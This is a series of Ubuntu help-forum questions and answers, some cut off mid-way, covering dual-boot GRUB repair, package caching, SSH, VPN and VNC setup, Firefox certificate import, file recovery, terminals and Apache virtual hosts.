I just got a new SSD hard drive for my thinkpad laptop. I just installed Vista with the factory CDs. On my old OS, my main OS was Ubuntu but I do want to keep Windows on a separate partition as a dual booth system. I definitely want to upgrade to Win 7 though and I will get it in a few days. \nMy question is: should I install Ubuntu now and then upgrade to Win 7 in a few days? or is that going to mess up with the grub (or something else)? If that is the case, then I'd rather wait to install Ubuntu until after I upgrade to Vista.\nP.S. I know that probably any kind of mess done by the Win upgrade could be fixed, but I just want to avoid wasting time.\n\nA: It's generally a good idea to do complete your Windows installation before installing Ubuntu. from my experience, Windows does not play nicely with other OSes and you would need to recover your Ubuntu installation via a \"Live disk\" boot.\nThis may not be the case with an upgrade however.\n\nA: Go ahead, and install Ubuntu now.\nYes, a week later the Win 7 upgrade WILL mess with your MBR/Grub/boot. But good news is: it WONT mess with your Ubuntu partition.\nThe point is: its SO easy to fix grub that you should not worry about this. Just follow these steps:\nBefore upgrading Windows (ie, while you still can boot Ubuntu):\n\n\n*\n\n*Burn an Ubuntu bootable CD, or use the \"Start Up Disk Creator\" utility from Menu -> System -> Administration to create a bootable USB key. You probably already have either the CD or USB, the same you will use for installing Ubuntu works fine\n\n*Give your Ubuntu partition a label. Not necessary, but helps.\nAfter upgrading Windows (to restore grub/Ubuntu):\n\n\n*\n\n*Boot using your CD/USB and start a Live session\n\n*Got to Home Folder -> Computer, find your Ubuntu partition, and double-click to mount it. If you have trouble finding which is your Ubuntu partition, use gParted. After mounting, take note of WHERE it was mounted (usually will be /media/LABEL, where LABEL is the Label of your Ubuntu partition, if it has one. Hence my previous suggestion on labeling it)\n\n*Also, using gParted, take a note of of which device is your boot drive. It will probably be /dev/sda\nNow for the \"real deal deal\":\n\n\n*\n\n*Open terminal, and: \n\n\nsudo grub-install --root-directory=/media/UBUNTU /dev/sda \nAnd thats it!\nReboot, and grub will show up, allowing you to use Ubuntu again\nNotes:\n\n\n*\n\n*In these examples, i assumed you labeled your Ubuntu partition UBUNTU, and your boot drive is /dev/sda. Check those values before issuing the grub-install\n\n*After booting on Ubuntu, do a sudo update-grub so it scans your drives again and add the Windows 7 partition to the list. It was there before, as Vista, but an update will fix menu name and other options\n\n*Dont worry about the error message: \"cannot find /boot device. (is /dev mounted?)\" while (re-) installing grub from Live CD. Its an annoying bug. If there is a message \"All steps successfull\" shows up, everything is fine.\n\nA: Installing Ubuntu after Windows\nUsually a Windows is already installed. If not then it 'should' be installed before Ubuntu because Windows cannot see other operating systems and tries to ignore them (or wipe them). The last boot-loader to be installed is the one that gets used and while the Windows one is blind to other operating systems the Ubuntu one defaults to including all other Operating Systems in it's boot-menu.\nIf you are able to partition the drive prior to installing Windows, leave space for Ubuntu during the initial partitioning process. Then you won't have to resize your NTFS partition to make room for Ubuntu later (saving a bit of time).\nInstalling Windows After Ubuntu\nNormally when Windows is installed after Ubuntu the \"Master Boot Record\", MBR, will be overwritten. You can bootup off a LiveCD and repair the MBR. However, there are 2 different approaches:\n* Recovering GRUB after reinstalling Windows\n* Master Boot Record backup and re-replacement\n\n\nA: According to Billy Gatee, all the computers in the universe should run on Windows and Windows only, So Windows is much of a bully with other OS, So id suggest you to to first get Upgraded from Vista to 7 and then install Ubuntu. After everything goes fine, give yourself a thought, When Ubuntu is so much customizable, compitable, secure and is a WINE drunker, Do you still see a thing in using Windows?\n", "Q: Where does Ubuntu store install files? When I download a package from Synaptic, where does Ubuntu store the install files, if at all? Bandwidth is limited in my country, and I would like to download programs only once and back them up for future use.\n\nA: Packages are stored in /var/cache/apt/archives/. I suggest using APTonCD \nsudo apt-get install aptoncd\n\nfor backing them up to a CD or DVD. You can then use this disk as an offline repository.\n", "Q: Is there a way to use a SSH connection to access SMB or UPnP files without setting up a VPN? What I'm trying to do is set up a SSH key that only gives access to certain directories, for security reasons I don't want it to have full access to my SSH server. I already have the ability to access the directories I need over my local network (right now using SMB, although I also used UPnP for awhile). I need, however, to be able to access those files securely over the internet from both Ubuntu and Windows machines.\nI'm somewhat new to SSH and not sure what the best approach to solving my problem is. If anyone knows how I can do this or where I can find a detailed tutorial I'd be grateful.\nAnd as always if anything is confusing or if there are any comments or corrections please let me know.\n\nA: My suggestion would be Change Root using ssh. This is a new feature of the OpenSSH server since version 4.8p1. (ubuntu package: openssh-server) and hence available on the newer ubuntu releases.\nIn a nutshell, if a certain user (for which you would distribute the key) logs in via ssh, he/she will be jailed inside  a named directory making access to anything that's outside of that inaccessible. This is particularly straightforward to set up if you only want access to files and not really run any programs for the chrooted user. See for instance here: http://www.howtoforge.com/chrooted-ssh-sftp-tutorial-debian-lenny\nIf you can elaborate on the specific needs that you have we can maybe comment more.\nAlso, once you have your jailed ssh user configured, you might want to consider sshfs (for ubuntu) and netdrive - http://www.netdrive.net (for windows) to seamlessly mount these directories on the respective machines.\n", "Q: Installing a minimal GUI + VNC I have a fresh install of Ubuntu 10.04 Server on my VPS and would like to install a minimal GUI onto this and allow VNC access to.\nPlease could someone outline the steps required to set this up so that I can VNC to my machine under a newly created user account.\nCreate the user:\nuseradd  -m -s /bin/bash -p password -d /home/usera userA\nchown userA:users /home/usera\n\nInstall the GUI\nsudo apt-get install --no-install-recommends ubuntu-desktop\n\nSetup VNC\n?\n\nA: i would not recommend the regular desktop but openbox or fluxbox\n\nA: When you have the GUI installed, run sudo apt-get install vino to install remote desktop support.

Just install them via:\nsudo apt install printer-driver-gutenprint\nIf not automatically recognized you need to manually add the driver via the printer settings.\n\nA: Go to the Canon website: \nhttp://software.canon-europe.com/products/0010697.asp\nDownload the MX320 driver (the driver contains all drivers) download the deb and install for both printing and scangear.

The behavior in Windows is such that I ran OpenVPN GUI and chose to connect to this particular VPN. It would then show the activity in the attempt to connect and opens a dialog box for username/password authentication.\nI've successfully imported all the configurations by changing the file type to .conf and using the import feature in network manager. However, attempting to connect would simply display the network manager's attempting to connect animation, but ultimately end with a notification of connection timing out. No prompt asking for authentication would appear at all, nor can I find any feature to prefix the authentication details.\nclient\ndev tun\nproto tcp\nremote miami.proxpn.com 443 \nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\ncert client.crt\nkey client.key\ncipher BF-CBC\nkeysize 512\ncomp-lzo\nverb 4\nmute 5\ntun-mtu 1500\nmssfix 1450\nauth-user-pass\nreneg-sec 0\n\n\n# If you are connecting through an\n# HTTP proxy to reach the actual OpenVPN\n# server, put the proxy server/IP and\n# port number here.

After importing the config file, if I were to remove them, would it cause any problem? Note, I haven't removed them, so the problem I'm facing is not due to the absence of these files.\n\nA: I think tail -f /var/log/{syslog,messages} followed by reconnecting the VPN could give some answers.\n\nA: Try connecting to VPN from command line. This will make sure that the problem is with NetworkManager and not something else. You can connect from command line using:\nopenvpn --config /path/to/config.ovpn\n\nYou may need to run this command using sudo. \nIf you can successfully connect from command line then try adding yourself to netdev group and uncheck Available to all users in vpn settings window in NetworkManager and then try connecting using NM.\n\nA: See the respective bugreport on launchpad.\n", "Q: Technique to Display Multiple Browser Windows Tiled at Same time? I have a separate monitor that I use for Toodledo (a web-based task managment app), in which I like to display various views (Next Action Status, Waiting Status, Planning Status, and Overdue Due-Date items). I've been playing around with some add-ons on Firefox that allow you to split the browser, but they are cumbersome. \nI'm now trying Chrome, and opening 4 different browser windows that I've tiled on the screen in quadrants (I use the Compiz grid applet for this). This is not ideal as each browser replicates the URL bar and the tab, and I don't have opening ths windows automated upon restart. Chrome is great in managing screen real estate, but this is not ideal. In Firefox I tried various extension to hide interface elements, but it was very clunky... Am wondering whether anyyone has tried to do similar with TD, and how they achieved what I'm going after?\nAm wondering whether someone has a good technique for accomplishing what I'm looking for?\n\nA: Chrome/ium\nThere are a few Chrome/ium extensions that mimic what you are trying to achieve, but I didn't find any exceptionally good ones.\nFirefox\nI did however find a pretty good Firefox extension for screen splitting: Fox Splitter, it seems to do the job well enough.\nOpera\nOpera provides built-in support for managing tabs in this manner. Right click the Tab Bar, go to Arrange and proceed to select Tile Vertically.\nSSB\nAlternatively, you could use an SSB (Single Site Browser or Site Specific Browser). An SSB is an application with an embedded browser designed to work exclusively with a single web application. It doesn't have the menus, toolbars and accoutrements of a normal web browser. You would then use one of these per web page and tile them using the Compiz grid plugin. You could use Mozilla Prism, an SSB that uses Firefox as its back-end. Chrome/ium also provide SSB functionality, this is done by first navigating to the desired web page, then clicking the Wrench Icon > Tools > \"Create Application Shortcuts...\".\nNote: My original answer contained more hyperlinks, but I was prevented from posting because I do not have enough reputation.\n\nA: If the toolbar and tab are the problem, why don't you get rid of both? This can be done in Views > Toolbars.\nIf you open another window from there and want your toolbar back, Alt + V will bring you back to the Views dropdown, whence you can add the toolbars back.\n", "Q: HDMI sound gone, can't figure out how to turn it back on I have had an Acer Revo box as a media centre for a while. I recently installed Ubuntu Server (10.10) on it and polished it up with nodm (one of the most simple ways to launch an X session) and installed boxee. It's been working fine for over a month.\nIt's just running ALSA. I've had problems with PulseAudio/Boxee/HDMI before so I wanted to keep it simple. And that worked. It pushed both PCM and digital (AAC and various Dolby codecs) over HDMI perfectly.\nBut I restarted it the other day after mucking around with some nfs configuration and now there isn't any sound.\nThe hardware is an ION chipset. Nvidia 9400M graphics with Nvidia MCP79/7A audio.\nOne thing I have noticed is there doesn't appear to be any sign of a IEC958 device. A traditional fix in the past for fresh installs has been to load alsamixer, find the IEC device and toggle its mute but I can't. I'm certain this used to represent the HDMI output. It just doesn't seem to exist any more unless I run sudo alsa-utils restart while boxee is running, when I see it in an error message:\n* Shutting down ALSA...

Turns out almost everything I observed was a complete red herring. Boxee was grabbing the sound device on boot and then wouldn't let its video player use it.\nThe fix is hacky but it works. It's a simple bait-and-switch. You write a script that edits the boxee config so the sound purposefully doesn't work, then start boxe (it tries to grab an imaginary card and fails) and then after a few seconds, the script puts the audio config back to what it should be, allowing videos to play sound.\nInstead of running the boxee binary directly, you just call the script.\nSee: http://jira.boxee.tv/browse/BOXEE-4411?page=com.atlassian.jira.plugin.system.issuetabpanels%3Acomment-tabpanel#issue-tabs\n", "Q: How does the Trash Can work, and where can I find official documentation, reference, or specification for it? When trying to manage trash can from mounted NTFS volumes, I ended up reading FreeDesktop.org's reference on it.\nPoking around and doing some tests, I realized Ubuntu/Gnome does not follow the specs 100%. Here's why:\n\n\n*\n\n*For non-/ partitions, it always uses <driveroot>/.Trash-<uid>, It never used <driveroot>/.Trash/<uid>, even when i created it in advance. While this works, it's annoying: if I have 15 users, I end up with 15 /.Trash-xxx folders in my drive, while the other approach would still give a single folder (with 15 sub-folders). That \"pollution\" in my drives is very unpleasant. And specs say \"If an $topdir/.Trash directory is absent, an $topdir/.Trash-$uid directory is to be used\". Well, it is present, so why does it never use it?\n\n*root trash does not work, at least not out of the box. Open nautilus as root and click on trash; it gives an error. Try to delete any file, it says \"it can't move to trash\". Ok, I know this can be fixed by creating /root/.local/share. But specs says \"A “home trash” directory SHOULD be automatically created for any new user. If this directory is needed for a trashing operation but does not exist, the implementation SHOULD automatically create it, without any warnings or delays.\". Why the error then? Bug?\n\n*Why must I change /etc/fstab entries for mounted volumes, adding options like uid and guid, if the volumes are already mounted as RW for everyone? \nThese are just some examples of deviation from the standard. So, the question is:\n\"If Ubuntu does not adhere 100% to the spec, HOW exactly does the trash work? WHERE can i find a technical reference for Ubuntu's implementation of the trash?\"\nBy the way: if Ubuntu does happen to follow specs, please tell me what I am doing wrong, especially regarding the /.Trash-<uid> vs /.Trash/<uid> issue.\nThanks!\nEDIT:\nSome more info:\n\n\n*\n\n*If a given fs has no support for the sticky bit (VFAT, NTFS), it probably doesn't have for permissions either (at least VFAT surely doesn't). So what prevents one user from purging / restoring other users' ./Trash-xxx ? If one can read/write his own Trash, one can do the same for the whole drive, including other's trashes, correct? Or does Gnome have some kind of \"extra\" protection on ./Trash-xxx folders on VFAT/NTFS fs?\n\n*If Linux can \"emulate\" file permissions on NTFS mounting by editing /fstab uid and gid options, can it also \"emulate\" the sticky bit? I would really prefer to use /.Trash/xxx format...\n\n*For the root issue: for the / partition, I can use trash as root, and it goes to /root/.local/share/Trash. But if I click on Nautilus \"Trash\" (as root), I get an error. Don't you? So files are correctly trashed, but I can't access it. All I can do is manually \"purge\" them  (by deleting files on /root/.local/share/Trash), but restoring would be very tricky (opening info files and manually moving, etc.).\n\n*For non-/ partitions (or at least for VFAT/NTFS), I can not even use trash as root: it does not create a ./Trash-0 folder, it simply says \"Cannot trash, want to permanently delete?\" Why?\n\n*About fstab: i use it for a permanent mount for my NTFS partitions. I have several, and if not \"pre-mounted\" they really clutter the desktop and/or Nautilus. I'd rather have it pre-mounted, integrated in my file system, in mounts like /data , /windows/xp , /windows/vista , and so on, and leave /media and its \"mount/unmount\" flexibility just for truly removable drives.\nSo, if Ubuntu/Gnome truly follows the spec, is there any way to fix the root issues and to \"emulate\" the sticky bit for (at least) my fstab'ed NTFS fixed partitions?\n\nA: GNOME is using .Trash correctly as far as I understand - if you look in gio/glocalfile.c source you'd see that it does make an attempt to use the .Trash directory if it exists. Do note though that the directory has to have the correct permissions for users to be able to safely store trash files in it (and in safely here, I mean that other users won't be able to recover user's trashed files). For this GNOME requires that the .Trash directory must have the sticky bit set on it - see Trash Directories,note (1) in FreeDesktop.Org's Trash specification.\nThe main problem with the above approach, is that most r/w removable media you find is FAT, which doesn't support the sticky bit so the only way to handle this safely is to use a per user trash directory.\nRegarding root Trash - I can't reproduce the problem you describe, it seems to work well for me.\nRegarding /etc/fstab - I'm not sure what is the problem there: you should need to mess around with fstab, unless you want full control over where an external file system is mounted. Normally removable media is mounted automatically upon detection in /media for the user that is currently active, but it is then inaccessible to any other user. If you want a different setup then you should mess with the configuration file. I don't see how that relates to trash, though.\n\nA: A bit late this, but if anyone is interested:\n,\nI had the same problem but, on advice I downloaded Dolphin. I then ran Dolphin through sudo dolphin in terminal. \nNow, right clicking on the Wastebin and selecting Empty Wastebin clears the files rather than producing an error.\nThis does not really relate to your question, but is simply a work around.\n", "Q: I would like to set 127.0.0.1 in my resolv.conf I was hoping to set my local host in my resolv.conf to hermes.

If so, how come the repository doesn't have it? I had the following repository for virtualbox in my /etc/apt/sources.list: deb ttp://download.virtualbox.org/virtualbox/debian maverick non-free\nThen I found out there was a new version when I opened it today (the program prompted me with a window to manually download it from Oracle's site). Then I tried sudo apt-get update && sudo apt-get upgrade and got nothing.\nHere you have a way to add virtualbox-4.0 to your apt-get, but the problem is that it isn't updating, meaning I would have the two installed. I'm also worried if I'll have to do something like that each time it updates since that would defeat the point of apt-get.\nI've been using virtualbox with the apt-get update for more than a year now and this is the first time it has happened, so I was wondering if there would be a way to just update my current installation.\n\nA: Virtual Box 4.0 is a major update. The previous version still needs to be supported. To acchieve this the Virtual Box repository will be available for both, the 3.x and the 4.x version.\nIf you want to run the latest version you need to add the 4.x repository to your sources. This is perfectly explained on the Virtual Box download page.\nBefore installing Virtual Box 4.0. you need to remove the previous version. Your private virtual machines will not be affected. However you will need to reinstall the newer Guest Additions, and if you need RDP or USB support you will also need to install the Oracle Vitual Box Extension Pack.\n\nA: VirtualBox 4 quite new and has a different package name as to not force everybody to upgrade at once (they still support 3.x IIRC).\nTo install it, add the repository, as you have and then just:\nsudo apt-get install virtualbox-4.0\n\nThis package is set to conflict with 3.x so that will be removed as part of the process.

Which guitar tuner do you guys suggest?\nI hope this isn't the wrong place for this question!!\n\nA: Guitar Tuner\n\nGuitar Tuner is a software allowing to tune a guitar according to a defined chord\n\nGuitar Tuner on launchpad\nGuiTuner\n\nGuiTuner is a simple guitar tuning program for Linux.\nGuiTuner tries to detect the pitch of the sound recorded in real time from the audio device using some methods ( by now only based on FFT ) that you can configure at runtime. It is self-explanatory, you just have to connect your guitar or your microphone to the sound card, configure the input device using a mixer and see what the program tells you: it displays the note nearest to the picked sound and the interval between it and the note produced by the instrument. If the sound produced is lower than the right one the left arrow becomes green, if is higher becomes green the right arrow.\n\nGui Tuner on digilander.libero.it\nOnline\nYou can also use an online guitar tuner.\n\nA: fmit  / sudo apt-get install fmit is included in the regular software sources. It was the only one that worked for me. Although you will need to fine tune a few of the settings. With older versions of Ubuntu I had the problem, that the sample rate was low, when the sound preferences were not open (weird - I know). A workaround to that is using pulseaudios oss-wrapper by starting fmit with:\npadsp fmit\n\n\nA: I've tried them all, and IMHO LINGOT is the easiest Guitar Tuner available on Linux.\nMore about it:\n\nLINGOT is a musical instrument tuner.\n  It's accurate, easy-to-use, and highly\n  configurable. Originally designed as a\n  guitar and bass tuner, its\n  configurability gives it a more\n  general character. It looks like an\n  analog tuner, with a gauge indicating\n  the relative shift to a certain note.\n  The program automatically guesses the\n  note to tune.\n\nRelated to this toppic, Rakarrack is the best Guitar Effects software out there. Before using it, you'll need to configure JACK (qjackctl) to connect the guitar audio input to the speakers output (at this link you'll find more info about how to use Rakarrack).\n\nA: I'm no expert and haven't used it, but Rakarrack sounds like it will fit the bill.  It's primarily an effects pedal, but also features a tuner.  Combined with Ardour or Audacity, it should let you plug your guitar straight into your Ubuntu PC and start recording.\n\nA: Try fmit :\nhttp://home.gna.org/fmit/\nIt's available in Debian and Ubuntu repositories.  It supports all the major Linux audio system standards, so I don't see any problems with it working on your system.\nIf you have trouble with fmit, then you probably need to poke around to learn some basics about Linux sound systems.  It's not always 100% plug & play, but usually the answer is simple when you find it.\nNo problem using the microphone.  Scaine probably meant whatever means you have to get guitar sound into the computer.\n", "Q: How to share an USB device(scanner) over network (from Windows to Ubuntu)?

As much as I hate Flash, I am trying to comply with their request. \nI have not been able to find a single Flash button generator for Ubuntu at all. Can someone point me in the right direction?\n\nA: I'd personally stick with your gut feeling and reject their request for Flash buttons for a few reasons:\n\n\n*\n\n*Search engines won't spider through them (essentially hurting the site's ranking).\n\n*Pages take longer to load because Flash adds a lot of overhead on low-powered systems. They won't work at all on things that don't support Flash (read: millions of smart phones).\n\n*Buttons are harder to edit and maintain.\n\n\nThe first two should be justification enough for the client.\nIf you need a button to do something fancy, I'd look to Javascript.

After running the command the certutil seems to have created a cert9.db, key4.db and pkcs12.txt file\nListing the contents using the command:\ncertutil -L -d sql:/home/df001/.mozilla/firefox/qe5y5lht.tc.default/\n\ndoes seem to confirm my attempts of importing files into a certificate folder of some kind have worked. because i get\n\nCertificate Nickname Trust Attributes\n  SSL,S/MIME,JAR/XPI\nThawte SSL CA „  Go Daddy Secure\n  Certification Authority „  Thawte SGC\n  CA „  Entrust Certification Authority\n  - L1C „  My Nero CT,C,c mynero P„  davidfield - Internet Widgits Pty Ltd\n  u,u,u\n\nSo, having tried this, and heading back over to the internet, I came across this command:\npk12util -d /home/df001/.mozilla/firefox/qe5y5lht.tc.default/ -i client.p12 -n “David Field” -P “cert8.db”\n\nthis again, appears to be importing something somewhere, however, again, Viewing certs from the Firefox interface doesn't show the imported Cert.\nI'm surmising here on reading that the certutil and pk12util are creating a new NSS database, which Firefox isn't reading. \nSo my question is, how can i get the p12 cert from the command line so it displays in the Firefox Certificate manager interface?\nWhy have i posted this here? Why not post on the Firefox forum? Well i will copy and post the same question there as well, however the ability to use the command line to do this is important, as I have potentially 2000 machines which will need a user cert imported into Firefox via a p12 file.

At my workplace (a university) we have two Ubuntu servers. One is a teacher server and the other is a student server. I am currently setting up a new server to replace the existing teacher server.\nThe new server is currently online and I am trying to get it setup so I can SSH into it from my home. Right now, I can SSH into the existing teacher or student server and then SSH into the new server. However, I can not SSH directly into the new server.\nWhat must I do so that I can SSH directly into the new server?\nThank you very much in advance for your time.\n\nA: If you already have ssh installed on the server and you can't connect from your home, probably you'll have to forward port 22 (or whatever port ssh is using) on the router.\n\nA: Make sure to install openssh-server using synaptic or apt: sudo apt-get install openssh-server.  At the end of the package install, the ssh service will be started automatically.  From there, you might want to update the sshd_config file as needed in /etc/ssh.\n\nA: First thing first: Can you SSH from a local connection, on the same internal network/segment ? If so, your server is OK. If not, install openssh-server, as previously mentioned. This will also generate local keys and will default to port 22/TCP. This can be changed later. \nSecond: If you are behind a firewall, can you ssh through it ? or is is right on a public IP address ? If you are on a public, reachable, IP address, and the first point was checked, you should be ready to go. However, there might be other transparent firewalls in the way, and this is out of your hands. The firewall admin will have to change that. get the IP of your own server, and ask that port 22 be open in inbound connection to your new Linux server. \nThird: Is your original server using the port 22, or another port ? If using port 22, are you using another port from, say, home ? If so, the firewall would have to get setup to first accept connections on this other port, and redirect those to the proper port of your Linux box. Sometime, those redirections are used so that only certain ports are allowed globally. If you are SSH'ing from another organization, can you ssh to another known box in this same port ? \nMany Many Many questions, I know, but those will help you pinpointing the actual problem and ask the right person. or fix the proper setting. The idea here is also to check from the closest connection to the most remote one. As you get further and further, you will be able to see if there is any issue and fix it.\n", "Q: Using DesktopCouch without Ubuntu One?

I have very a simple question.

The .ogg and .ogv files have very similar layouts, so PhotoRec might be able to recover your file (as it did for me).\nYou of course have to launch the programme from a LiveCD or other partition, otherwise you may overwrite your original file.\nGood luck.\n\nA: PhotoRec does not utilize the file system, as the original website states https://www.cgsecurity.org/wiki/PhotoRec\nThat is the reason why it has a problem with fragmented files and that it likely the reason why\n\nIt's only part of it but it works\n\nDepending on the situation file system-based approaches or raw data-approaches (so called Carving) provide better results.\n(e.g. The larger the file and the fuller the disk, the higher the chances for fragmentation). As Carving does not utilize the file system, it cannot determine filename and path of the recovered file.\nThe thing about the inode reuse is that inodes do not contain all the data (except maybe for very small files, in NTFS very small files are stored in the MFT directly). So even if the inode is still there the section of the disk where the data was stored may be reused (even if the inode is not).\nextundelte or ext4magic do utilize the file system and may be helpful.\n", "Q: Fonts totally unreadable I've just upgraded from 10.04 to 10.10 and my fonts are all just small rectangles with nothing in them.

Recently I have been playing around in terminal and typed the who command. As I see my username and date, I don't know what tty7 (tty2 on Ubuntu 17.10 and newer) or what this pts/0 is, can somebody explain this to me?\n\nA: The name of TTY actually comes from the old days of computers: then computers even had  teletypewriters as terminal, so you could see the output of programs printed (tty = TeleTYpe/TeleTYpewrite).\nTTY usually refers for \"physical\" terminals, like more attached terminals (even like a teletypewriter) to a single computer, or in our days: more separated text consoles, you can switch between them Ctrl + Alt + F1-F7 (or more, if you have configured more;  F3-F6 on Ubuntu 17.10 and newer).\nIn case of Ubuntu, tty7 is usually used by Xorg/Wayland display server, do provide your graphical environment (to be more exact, it provides a \"windowing system\" only, and things like the gnome - as a desktop environment solution - runs \"top of it\").\nBy contrast, \"pts\" is (one half of) a notion of \"pseudo terminal\" which implements terminal functionality without the context of a \"real\" physical terminal, for example if you open gnome-terminal, for the shell (which is usually the bash on Ubuntu systems) to be able to run, it needs terminal capabilities.\nThis is also the case if you use \"ssh\" to log in a remote machine, so in nutshell: whenever something needs terminal/tty like functionality without having a 'real' tty.\n\nA: I think usually it's the display server (X server).\nPress Ctrl+Alt+F7 (F3 on Ubuntu 17.10 and newer) and see if it takes you to your graphical login session (or keeps you there).\nYou can also open a shell and run tty.  It will tell you the name of your current terminal.\n\nA: tty7 is the physical terminal from which you logged in. In many cases, tty7 is where your window manager runs and from which you login.\nAs can be seen from the listing below, I logged in at 9:33 on May 24 from tty7 (via Gnome window manager login dialog) and then opened 4 pseudo terminals.\n[iluvblender@myhome ~]$ last | tac | egrep \"May\\s*24\"\n\nsgoda    tty7         :0               Wed May 24 09:33   still logged in   \nsgoda    pts/0        :0               Wed May 24 09:33   still logged in   \nsgoda    pts/2        :0               Wed May 24 09:36   still logged in   \nsgoda    pts/4        :0               Wed May 24 09:40   still logged in   \nsgoda    pts/5        :0               Wed May 24 09:42   still logged in \n\n", "Q: Recommended workflows for Apache virtual hosts? I do a lot of local web development work on my Ubuntu machine, and I'm constantly setting up virtual hosts in Apache. I don't need to do hard core server management, but I am getting tired of the repetitive process of manually adding config directives to files in /etc/apache2/sites-available/ and then updating the /etc/hosts file. \nIs there a more efficient or more automated way to do all this that I'm missing? Maybe something like rapache but that's actually working?\n\nA: When I had to do shuch things I proceed creating a VirtualHost whit a wildcard name:\n\n\n*\n\n*Choose a fancy domain name like 'example.com' for localhost\n\n*Place it in /etc/hosts file as 127.0.0.1 *.example.com\n\n*Install and activate mod_rewrite\n\n*create a wildcard VirtualHost in apache sites directory:\n<VirtualHost 127.0.0.1:80>\n  DocumentRoot /default/path\n  ServerName example.com\n  ServerAlias *.example.com\n  RewriteEngine On\n  UseCanonicalName Off\n\n  RewriteCond %{HTTP_HOST} ^(.*).example.com\n  RewriteCond /srv/%1/ -d\n  RewriteRule ^(.+)   %{SERVER_NAME}$1 [C]\n  RewriteRule ^([^.]+)\\.example\\.com/(.*) /srv/$1/$2 [L]\n</VirtualHost>\n\n\n*Now you can place any folder under /srv/ and it will be the root for <foldername>.example.com\nThis is borrowed from memory, it could need some more minor adjustments and it may conflict with any other rewrite rules each webapp would have. But it fits me for my webapp testing needs.\n\nA: would webmin work ? It's not just for apache but rather a web interface to system administration. It does have a form filling interface to apache virtual host. \n\nA: why not make a website that makes/updates the files for you? if you are working with php and this is local only use the exec() function to run terminal commands to write/create/update data that you want based on textbox entries. I wish i knew how to make applications on ubuntu that are gui based. would make life really easy.\n", "Q: WinSplit Revolution for openbox?

(However, openbox is the default windowmanager for crunchbang, so my assumption is that it should.)\nTwo other possibilities are \nxmonad and PyTyle .\n\nA: development in azulejo is going slow but steady. I fixed a few bugs and built a deb package so anyone can try it with minimal effort.\nhttp://lamehacks.net/blog/tag/azulejo/\nThe default keymap looks like this:\nSuper+2     Place two windows side by side\nSuper+3     Place a window on the left half of the screen and two on the right half\nSuper+4     Arrange four windows two by two\nSuper+R     Rotate windows' positions i.e. cycle windows\nSuper+H     Resize and move current window to the left\nSuper+K     Resize and move current window to the right\nSuper+Y     Resize and move current window to left upper corner\nSuper+U     Resize and move current window to right upper corner\nSuper+B     Resize and move current window to left lower corner\nSuper+N     Resize and move current window to right lower corner\n\nI tried to make it as customizable as possible.

(Click the button on the website to install the dependencies via apt, then unzip and run quicktile.py)\n\n*Uses libwnck for window manipulation, so it should work on any X11 desktop\n\n*Written in easily-extended Python (2.x at the moment)\n\n", "Q: How do I compress a directory? I'm trying to compress a directory and ftp it to a windows ftp. \nI have tried every tar command I can find to compress a directory. It appears to be ok. Then I transfer it and view it's contents using Winrar. Winrar keeps telling me the file is corrupted. I have viewed other .gz or .bz2 files using winrar but for some odd reason I can't get it to work. \nI would prefer just to have it zip the files so they have a .zip extension but even then when i try to browse it's contents both windows and winrar claim it's corrupt.\nDoes anyone else have a suggestion as to something else to try?\n\nA: Campression can be done using tar, zip, p7 and even rar in ubuntu. You will need to install rar for rar archiving.\nSimply right clicking gives you the options for compressing with installed archivers. \n\nIf you want to use \"zip\" for .zip extentension you can see manual of zip. The commandline for using tar is:\ntar cvzf tarball.tar.gz directory/\n\n\nA: Compression of directories, using parallel compression is an efficient way to save time.\npbzip2 can help you getting directories compressed.\ntar cf <outputfile_name> --use-compress-prog=pbzip2 <directory_name>\n\n\nA: Well, most probably your files are perfectly fine before FTP transmission.\nUnfortunately, probably you are transferring your files using wrong FTP mode.\nFTP do have two modes: binary and ASCII. By default most clients use ASCII mode, which breaks your binary files completely. I don't know which FTP client you are using, but for example in ncftp you can use command \"binary\" to switch to binary mode.\nIf you want to create ZIP files using Ubuntu (or almost any other Linux), use zip. You can install it to Ubuntu by running\nsudo apt-get install zip\n\nThen you can create zip file by running\nzip -r compressed_filename.zip foldername\n\n\nOn related note, you should know that FTP is insecure transmission protocol. Consider switching to sftp, for example. There is many free ssh servers for Windows, including minimal OpenSSH port.\n", "Q: Ruby Script Runner for Ubuntu Gedit I have this Java script runner installed in my gedit external tools:\n#!/bin/sh\ncd $GEDIT_CURRENT_DOCUMENT_DIR\nif javac $GEDIT_CURRENT_DOCUMENT_NAME;\nthen\njava ${GEDIT_CURRENT_DOCUMENT_NAME%\\.java}\nelse\necho \"Failed to compile\"\nfi\n\nI tried modifying to it to something like this\n#!/bin/sh\ncd $GEDIT_CURRENT_DOCUMENT_DIR\nruby ${GEDIT_CURRENT_DOCUMENT_NAME%\\.rb}\n\nbut it doesn't work.

When i right click on one Directory there is move to action, and there is only two options, Home folder and Desktop\n \nIs it possible to customize this action to many more or another one?\n\nA: I don't know about adding destinations to that menu itself, but Ubuntu Tweak can add an alternative move to option which presents a dialog to choose any folder as a destination.\nTo enable, in Ubuntu Tweak under Manage Scripts drag \"Move to...\" from the right pane to the left.\nAs you can see from the screenshot, this is an additional menu entry under a subfolder, so it isn't as seamless integration as would be nice, but it is useful.\n\n\nA: This has been an idea on Ubuntu Brainstorm for quite some time now, so in short: no, there is no quick and easy way to change the actual Move To menu. See also this related question on AskUbuntu.\nHowever, as mentioned, you can use Nautilus scripts to add this functionality. These are scripts that have to be placed in ~/.gnome2/nautilus-scripts and have to be executable. This way Nautilus will recognize them and add a Scripts entry in your right click menu.

That means the man-page you want to read is man bash. Or you can get help on bash builtins and keywords with the help builtin, e.g. help echo.\nThe information you see when you run man echo, is for the external echo command, installed by GNU coreutils.

Now I'd always separated my /home partition for an easier transition to a new Ubuntu installation. \nWhat is the recommended partition set up for the smoothest Ubuntu experience?\n\nA: For smoothest experience, you should use only single partition (+ probably boot + definitely swap).\nAdvantages\nYou don't have to care about disk sizes. With multiple partitions, if you reserve 10GB for root partition, then it's getting too small if you install few larger programs, and do not clean up log files and so on. That's not really smooth.\nDistribution upgrade do not require separate /data or /home partition. If you want to change distribution (from Ubuntu to Debian or something), then it's useful.\nDisadvantages\nIf you fill your home folder with some files, whole system will have problems. My experience says that without software RAID5 or RAID6 you do not have problems with that (you can still boot and then delete files), but it's anyway annoying.\n\nAlso, you shouldn't create new folders to root directory. There is Filesystem Hierarchy Standard. \n\n... must never create or require special files or subdirectories in the root directory. Other locations in the FHS hierarchy provide more than enough flexibility for any package.\n\n\nA: That entirely depends on what you're doing with it. For most uses, I go for a 10-40 GB /, swap equalling 2x system memory, and a bunch for /home, but if I was running a server on it, something where a mail queue or system logs could get big 